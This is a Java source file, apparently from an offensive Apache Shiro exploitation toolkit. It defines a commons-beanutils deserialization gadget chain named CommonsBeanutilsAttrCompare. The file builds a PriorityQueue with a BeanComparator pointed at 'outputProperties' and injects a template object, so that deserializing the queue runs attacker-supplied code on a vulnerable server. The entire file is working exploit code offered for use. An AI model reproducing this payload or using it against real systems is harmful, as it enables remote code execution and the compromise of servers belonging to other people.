package com.sma11new.exp.shiro.attack.payloads;

import cn.hutool.core.util.RandomUtil;
import com.sma11new.exp.shiro.attack.payloads.annotation.Authors;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;
import java.util.Queue;

@Dependencies(value={"commons-beanutils:commons-beanutils:1.8.3"})
@Authors(value={"\u6c34\u6ef4"})
public class CommonsBeanutilsAttrCompare
implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        AttrNSImpl attrNS1 = new AttrNSImpl();
        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
        String baseString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        String pass = RandomUtil.randomString(baseString, 2);
        attrNS1.setValues(coreDocument, pass, pass, pass);
        BeanComparator beanComparator = new BeanComparator(null, new AttrCompare());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(attrNS1);
        queue.add(attrNS1);
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        return queue;
    }
}

